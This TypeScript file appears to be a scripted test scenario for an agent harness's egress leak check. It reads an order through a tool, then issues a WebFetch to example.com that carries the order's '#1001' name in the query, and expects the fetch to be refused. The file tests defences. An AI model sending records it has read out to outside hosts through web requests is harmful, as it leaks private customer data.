// Scripted scenario for M1-G (fetch leak check): read an order through the hub, then WebFetch a listed host
// (`example.com`) carrying that order's `#1001` name in the query. The egress refuses it with `leak` before DNS.
import type { MessagesRequest, Scenario } from '../index.ts'

export const WEBFETCH_LEAK_REFUSED_ANSWER = 'WebFetch was refused by the leak check.'

const HARNESS_MODEL = 'claude-sonnet-5-5'

const isMainLoop = (r: MessagesRequest): true | string => {
  if (r.model !== HARNESS_MODEL) return `model ${String(r.model)}, not ${HARNESS_MODEL}`
  if (!Array.isArray(r.tools) || r.tools.length === 0) return 'no tool list (a side request)'
  return true
}

const resultBlock = (r: MessagesRequest, id: string): { is_error?: unknown } | undefined => {
  for (let i = r.messages.length - 1; i >= 0; i--) {
    const m = r.messages[i]!
    if (m.role === 'system') continue
    if (m.role !== 'user' || !Array.isArray(m.content)) return undefined
    const hit = m.content.find(
      b => typeof b === 'object' && b !== null && (b as { type?: unknown }).type === 'tool_result' && (b as { tool_use_id?: unknown }).tool_use_id === id,
    )
    if (hit) return hit as { is_error?: unknown }
  }
  return undefined
}

const isErrorResult = (id: string, wantError: boolean) => (r: MessagesRequest): true | string => {
  const m = isMainLoop(r)
  if (m !== true) return m
  const b = resultBlock(r, id)
  if (!b) return `no result for ${id}`
  return (b.is_error === true) === wantError ? true : `result for ${id} has is_error=${String(b.is_error)}, expected ${String(wantError)}`
}

export const LEAK_CHECK_SCENARIOS: Record<string, Scenario> = {
  'webfetch-leak': {
    turns: [
      { content: [{ type: 'tool_use', id: 'toolu_scripted_leak_read', name: 'mcp__apps__orders_search', input: { first: 1 } }], expect: isMainLoop },
      {
        content: [{ type: 'tool_use', id: 'toolu_scripted_leak_fetch', name: 'WebFetch', input: { url: 'https://example.com/?order=%231001', prompt: 'Summarise the page' } }],
        expect: isErrorResult('toolu_scripted_leak_read', false),
      },
      {
        content: [{ type: 'text', text: WEBFETCH_LEAK_REFUSED_ANSWER }],
        expect: isErrorResult('toolu_scripted_leak_fetch', true),
      },
    ],
  },
}
